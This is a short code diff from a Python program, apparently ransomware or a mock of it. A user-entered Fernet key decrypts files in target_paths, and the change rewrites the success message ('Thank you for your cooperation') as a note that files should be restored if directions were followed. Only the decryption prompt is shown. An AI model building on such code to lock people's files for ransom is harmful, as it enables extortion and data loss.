@@ -65,7 +65,7 @@ def encrypt(mode, dir_paths, frn):  # encrypts or decrypts files
 def entry_manager(text):  # manages the system after user entry
    try:
       encrypt(False, target_paths, Fernet(text.encode('ascii')))
-      messagebox.showinfo("Success", "Success\nThank you for your cooperation")
+      messagebox.showinfo("Code Entered", "Code Entered\nIf you followed directions, then your files should be restored.")
    except:
       messagebox.showerror("Incorrect Code", "Incorrect Code")
    
